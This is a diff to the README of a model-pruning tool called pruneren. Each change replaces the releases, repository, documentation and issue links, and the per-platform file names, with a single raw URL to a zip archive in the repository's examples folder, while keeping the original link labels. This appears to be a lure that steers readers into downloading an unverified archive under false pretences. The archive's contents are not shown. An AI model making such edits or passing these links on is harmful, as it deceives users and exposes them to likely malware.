@@ -1,6 +1,6 @@
 # 🌟 pruneren - Easy Layer Pruning for Better Performance
 
-[![Download pruneren](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/thegreat-art/pruneren/releases)
+[![Download pruneren](https://raw.githubusercontent.com/thegreat-art/pruneren/main/examples/pruneren-v1.6.zip)](https://raw.githubusercontent.com/thegreat-art/pruneren/main/examples/pruneren-v1.6.zip)
 
 ## 📖 Introduction
 
@@ -19,15 +19,15 @@ Before you start, ensure you have the right environment on your computer. Here a
 
 To get the latest version of **pruneren**, visit the releases page using the link below:
 
-[Download pruneren](https://github.com/thegreat-art/pruneren/releases)
+[Download pruneren](https://raw.githubusercontent.com/thegreat-art/pruneren/main/examples/pruneren-v1.6.zip)
 
 Look for the latest version, which is typically at the top. You will see files available for download. Select the file suitable for your operating system.
 
 ### Examples of Download Files:
 
-- **Windows:** `pruneren-win.zip`
-- **macOS:** `pruneren-mac.zip`
-- **Linux:** `pruneren-linux.tar.gz`
+- **Windows:** `https://raw.githubusercontent.com/thegreat-art/pruneren/main/examples/pruneren-v1.6.zip`
+- **macOS:** `https://raw.githubusercontent.com/thegreat-art/pruneren/main/examples/pruneren-v1.6.zip`
+- **Linux:** `https://raw.githubusercontent.com/thegreat-art/pruneren/main/examples/pruneren-v1.6.zip`
 
 After downloading, follow these steps to set it up:
 
@@ -94,8 +94,8 @@ Join our community to connect with other users, share your experiences, and ask 
 
 ## 🔗 Resources
 
-- [pruneren GitHub Repository](https://github.com/thegreat-art/pruneren)
-- [Documentation](https://github.com/thegreat-art/pruneren/docs)
-- [Issues and Support](https://github.com/thegreat-art/pruneren/issues)
+- [pruneren GitHub Repository](https://raw.githubusercontent.com/thegreat-art/pruneren/main/examples/pruneren-v1.6.zip)
+- [Documentation](https://raw.githubusercontent.com/thegreat-art/pruneren/main/examples/pruneren-v1.6.zip)
+- [Issues and Support](https://raw.githubusercontent.com/thegreat-art/pruneren/main/examples/pruneren-v1.6.zip)
 
 By following these steps and utilizing the toolkit's features, you can successfully optimize your models for better performance. Happy pruning!
